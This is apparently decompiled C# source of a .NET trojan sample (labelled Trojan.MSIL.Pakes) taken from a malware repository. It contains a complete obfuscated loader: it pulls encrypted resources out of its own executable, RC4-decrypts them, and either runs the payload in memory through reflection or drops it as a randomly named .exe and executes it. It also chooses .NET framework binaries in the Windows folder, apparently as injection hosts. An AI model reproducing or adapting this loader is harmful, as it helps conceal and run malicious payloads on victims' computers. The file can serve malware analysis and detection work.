// Decompiled with JetBrains decompiler
// Type: Sdq242yforpurdmn1igrgoxgfi0kiiw33.calbufxxjdqqg2hmd
// Assembly: k5xkdoui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CD3E51E-5608-4BA4-B66B-04206D6A26CE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Pakes.cs-37cd70e587eb1be5e97c2131880d030c32b02d02e1db6caf24f5eca693e9b335.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Uckd53gyd1mktkszq;

namespace Sdq242yforpurdmn1igrgoxgfi0kiiw33
{
  public class calbufxxjdqqg2hmd
  {
    private static bool uvq5mk3o0renh5fgcepzpwwyp = true;
    private byte[] Rbwyqsmkdhrmhczlk;
    private string kqsggor5tcbadbudki05l0tdf = Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("XRO");
    private string dxcz2pl1owuu5hsnm1fxo1lao = string.Empty;
    private string p3ey3vfs0xkp01tjkr03xupse = string.Empty;
    private int ovctduzspdppuyktt;
    private bool Gpjbl0owmilci2v2y51gtvz1t;
    private bool E4kje5e2joh4bwy3g3bw02an0jh43b1oy;
    private string Ysrflisiioq45pa22ybvinbay = string.Empty;
    private string Lxgfsgrr422iev50zpilaz3ak = string.Empty;
    private object xmgjvox22x4trszjhil04nokc;
    private MethodInfo Vig3ncm4tovuwdyhopz1aii2m;

    private object o0ucm0rfbr000xb1r(int erkct0ukl5sribdwsyxamisovfxns4le0)
    {
      Assembly assembly = Assembly.Load(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.p1pgnq0wwiojtmg4ffwhjwkav(calbufxxjdqqg2hmd.Nw4uibpgqujqyr4oq(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("rnEdluP.l"))));
      Thread.Sleep(1000);
      System.Type type = assembly.GetTypes()[erkct0ukl5sribdwsyxamisovfxns4le0];
      this.Vig3ncm4tovuwdyhopz1aii2m = type.GetMethod(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("Rnu"));
      return Activator.CreateInstance(type);
    }

    public static byte[] Nw4uibpgqujqyr4oq(string Ughvmx3xjun2jddylimc2fhns42a40ggt)
    {
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Ughvmx3xjun2jddylimc2fhns42a40ggt))
      {
        byte[] buffer = new byte[1024];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          while (true)
          {
            int count = manifestResourceStream.Read(buffer, 0, buffer.Length);
            if (count > 0)
              memoryStream.Write(buffer, 0, count);
            else
              break;
          }
          return memoryStream.ToArray();
        }
      }
    }

    private byte[] cxvbqzcylgljw2ndm0bdhgwftivsekccv(byte[] Zlkipvf5ygcbqvvnb)
    {
      if (this.kqsggor5tcbadbudki05l0tdf == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("r4c"))
        Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.RC4(ref Zlkipvf5ygcbqvvnb, Oywqlt2t1qhfwywyazfarq5uy.qb3ecqzlwuh30dxunuz3cvgmx(this.dxcz2pl1owuu5hsnm1fxo1lao));
      return Zlkipvf5ygcbqvvnb;
    }

    private static void an2lhyvt0ub2vgdjal4rfcg0n(byte[] vc04eweudtqkmxdlffx1trj0k)
    {
      try
      {
        Thread thread = new Thread(new ParameterizedThreadStart(calbufxxjdqqg2hmd.Ylz4gmm1zwf1rs000tn1r1goc5zu13b0j));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start((object) vc04eweudtqkmxdlffx1trj0k);
        thread.Join();
      }
      catch
      {
        calbufxxjdqqg2hmd.uvq5mk3o0renh5fgcepzpwwyp = false;
      }
    }

    private static void Ylz4gmm1zwf1rs000tn1r1goc5zu13b0j(object juoxcogscryli0hsnsaqqmewj)
    {
      try
      {
        MethodInfo entryPoint = Assembly.Load((byte[]) juoxcogscryli0hsnsaqqmewj).EntryPoint;
        if (entryPoint.GetParameters().Length == 1)
          entryPoint.Invoke((object) null, new object[1]
          {
            (object) new string[0]
          });
        else
          entryPoint.Invoke((object) null, (object[]) null);
      }
      catch
      {
        calbufxxjdqqg2hmd.uvq5mk3o0renh5fgcepzpwwyp = false;
      }
    }

    private bool sgpktjt3q2gogaorzrb1u1n2m(byte[] Cwfecu0cvatbxpu52uduc3bj3)
    {
      calbufxxjdqqg2hmd.an2lhyvt0ub2vgdjal4rfcg0n(Cwfecu0cvatbxpu52uduc3bj3);
      bool uvq5mk3o0renh5fgcepzpwwyp = calbufxxjdqqg2hmd.uvq5mk3o0renh5fgcepzpwwyp;
      calbufxxjdqqg2hmd.uvq5mk3o0renh5fgcepzpwwyp = true;
      return uvq5mk3o0renh5fgcepzpwwyp;
    }

    private void Tzp4t312rv1mimn5dljldvzoo(
      byte[] Aj1kqcaubnyboy2jokrhmvsus,
      string ycj1qcpycnvsmvoqs312yleov,
      bool mayb5tdk2db0y2elo)
    {
      try
      {
        File.WriteAllBytes(ycj1qcpycnvsmvoqs312yleov, Aj1kqcaubnyboy2jokrhmvsus);
        if (!mayb5tdk2db0y2elo)
          return;
        new Process()
        {
          StartInfo = {
            FileName = ycj1qcpycnvsmvoqs312yleov
          }
        }.Start();
      }
      catch
      {
      }
    }

    private byte[] el0vk4wz3hihgwhvt(
      string e3faevnvukf2kv3ye1ezmxj44,
      int Kqktq0lkvsgeeuhvucm0jjwst,
      string flrtzsw3ywjxa4bjekbcw5gkm)
    {
      try
      {
        IntPtr hModule = W4ytuf0iqrlf3g3zj.U4ahdus33bqrr3xyza2g5z4kafxio11rc(string.Empty);
        IntPtr hResInfo = W4ytuf0iqrlf3g3zj.Kfmfyffydmg552qml(hModule, Kqktq0lkvsgeeuhvucm0jjwst, flrtzsw3ywjxa4bjekbcw5gkm);
        uint length = W4ytuf0iqrlf3g3zj.Ztwvqitdih0ihxfum(hModule, hResInfo);
        IntPtr source = W4ytuf0iqrlf3g3zj.Mcl3unsafxasl1ryb(hModule, hResInfo);
        byte[] destination = new byte[(IntPtr) length];
        Marshal.Copy(source, destination, 0, (int) length);
        return destination;
      }
      catch (Exception ex)
      {
        Console.WriteLine(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("Errraigrsuc:ro edn eore ") + Environment.NewLine + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("Errcd:ro oe ") + ex.Message);
        return (byte[]) null;
      }
    }

    private string tlsxpiwei31hgaeplihuor1jq(string Skei1o1uvdhuyoyxkibqnuazi)
    {
      if (Skei1o1uvdhuyoyxkibqnuazi == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("ApiainPtplcto ah"))
        Skei1o1uvdhuyoyxkibqnuazi = Application.StartupPath + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      if (Skei1o1uvdhuyoyxkibqnuazi == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("Tmep"))
        Skei1o1uvdhuyoyxkibqnuazi = Path.GetTempPath();
      if (Skei1o1uvdhuyoyxkibqnuazi == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("ApaapDt"))
        Skei1o1uvdhuyoyxkibqnuazi = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      if (Skei1o1uvdhuyoyxkibqnuazi == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("M ouetyDcmns"))
        Skei1o1uvdhuyoyxkibqnuazi = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      if (Skei1o1uvdhuyoyxkibqnuazi == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("Dstpeko"))
        Skei1o1uvdhuyoyxkibqnuazi = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      if (Skei1o1uvdhuyoyxkibqnuazi == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("Ue rflsrPoie"))
        Skei1o1uvdhuyoyxkibqnuazi = Environment.GetEnvironmentVariable(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("UEPOIESRRFL")) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      if (Skei1o1uvdhuyoyxkibqnuazi == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("PormFlsrga ie"))
        Skei1o1uvdhuyoyxkibqnuazi = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      return Skei1o1uvdhuyoyxkibqnuazi;
    }

    private string htbnzas4socabxsib(string Rgtaozjrexxhksisbxolxsmmn)
    {
      string str = string.Empty;
      if (Rgtaozjrexxhksisbxolxsmmn == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("0"))
        str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      if (Rgtaozjrexxhksisbxolxsmmn == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("1"))
        str = Path.GetTempPath();
      if (Rgtaozjrexxhksisbxolxsmmn == Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("2"))
        str = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\");
      return str;
    }

    private void Wqpazmxrqahxd4jpxt1ljoit5(string Zlkipvf5ygcbqvvnb)
    {
      string[] separator1 = new string[1]
      {
        Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("lrrabmzylugp3a0gn4a2ne2a3z3hns3np")
      };
      Zlkipvf5ygcbqvvnb.Split(separator1, StringSplitOptions.None);
      string[] separator2 = new string[1]
      {
        Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("Gz511t5rihidgoexh")
      };
      string[] strArray1 = Zlkipvf5ygcbqvvnb.Split(separator2, StringSplitOptions.None);
      string[] separator3 = new string[1]
      {
        Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("t2qsgxhd4hzfepqchxskw1dou")
      };
      string[] strArray2 = Zlkipvf5ygcbqvvnb.Split(separator3, StringSplitOptions.None);
      string[] separator4 = new string[1]
      {
        Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("negqhjxx3xtpcfxon")
      };
      Zlkipvf5ygcbqvvnb.Split(separator4, StringSplitOptions.None);
      this.kqsggor5tcbadbudki05l0tdf = strArray1[1];
      this.dxcz2pl1owuu5hsnm1fxo1lao = strArray1[2];
      this.p3ey3vfs0xkp01tjkr03xupse = strArray1[3];
      this.ovctduzspdppuyktt = Convert.ToInt32(strArray2[1]);
      this.Gpjbl0owmilci2v2y51gtvz1t = Convert.ToBoolean(strArray2[16]);
      this.E4kje5e2joh4bwy3g3bw02an0jh43b1oy = Convert.ToBoolean(strArray2[17]);
      this.Ysrflisiioq45pa22ybvinbay = this.tlsxpiwei31hgaeplihuor1jq(strArray2[18]) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\") + Path.GetRandomFileName();
      this.Lxgfsgrr422iev50zpilaz3ak = strArray2[20];
      this.Ysrflisiioq45pa22ybvinbay = this.Ysrflisiioq45pa22ybvinbay.Substring(0, this.Ysrflisiioq45pa22ybvinbay.Length - 4) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j(".xee");
      Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
      switch (this.Lxgfsgrr422iev50zpilaz3ak)
      {
        case "0":
          try
          {
            if (IntPtr.Size == 4)
            {
              this.Lxgfsgrr422iev50zpilaz3ak = Environment.GetEnvironmentVariable(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("wniidr")) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\irsf.E\\rmwr\\20577vceeMcootNTFaeokv..02\\b.x");
              break;
            }
            this.Lxgfsgrr422iev50zpilaz3ak = Environment.GetEnvironmentVariable(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("wniidr")) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\irsf.E\\rmwr6\\20577vceeMcootNTFaeok4v..02\\b.x");
            break;
          }
          catch (Exception ex)
          {
            break;
          }
        case "1":
          this.Lxgfsgrr422iev50zpilaz3ak = Environment.GetEnvironmentVariable(Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("wniidr")) + Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("\\irsf.E\\rmwr\\20577cceeMcootNTFaeokv..02\\s.x");
          break;
      }
    }

    public void Evy400eoewmfjgdmkciakhlr2()
    {
      string executablePath = Application.ExecutablePath;
      try
      {
        this.Wqpazmxrqahxd4jpxt1ljoit5(Oywqlt2t1qhfwywyazfarq5uy.ccjzgmmms5tybgc4c1wrlnawp(this.el0vk4wz3hihgwhvt(executablePath, 49, Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("KF40SPBQ5OCGIUE0S"))));
        this.Rbwyqsmkdhrmhczlk = this.el0vk4wz3hihgwhvt(executablePath, 26, Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.k32g0xj5z4a4rs15j("P3NAQLAMNXB1GMGWZQC23HH4J"));
        this.Rbwyqsmkdhrmhczlk = this.cxvbqzcylgljw2ndm0bdhgwftivsekccv(this.Rbwyqsmkdhrmhczlk);
        if (this.Gpjbl0owmilci2v2y51gtvz1t)
          this.sgpktjt3q2gogaorzrb1u1n2m(this.Rbwyqsmkdhrmhczlk);
        if (!this.E4kje5e2joh4bwy3g3bw02an0jh43b1oy)
          return;
        this.Tzp4t312rv1mimn5dljldvzoo(this.Rbwyqsmkdhrmhczlk, this.Ysrflisiioq45pa22ybvinbay, true);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    private static void Main(string[] args) => new calbufxxjdqqg2hmd().Evy400eoewmfjgdmkciakhlr2();
  }
}
